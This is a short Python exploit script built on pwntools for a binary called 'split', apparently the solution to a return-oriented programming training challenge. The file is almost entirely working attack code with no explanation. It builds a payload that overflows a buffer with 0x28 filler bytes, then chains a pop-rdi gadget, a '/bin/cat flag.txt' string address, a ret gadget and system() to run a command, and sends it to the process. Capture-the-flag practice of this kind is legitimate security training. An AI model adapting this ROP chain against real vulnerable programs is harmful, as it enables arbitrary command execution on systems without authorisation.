#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./split')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

POPRDI = 0x4007c3
RET = 0x40053e
SYSTEM = 0x400560
BINCATFLAGTXT = 0x601060

io = start()

# 0x48 bytes long
attack = b"A"*0x28 + p64(POPRDI) + p64(BINCATFLAGTXT) + p64(RET) + p64(SYSTEM)
print(attack)
print(len(attack))
io.sendline(attack)

io.interactive()
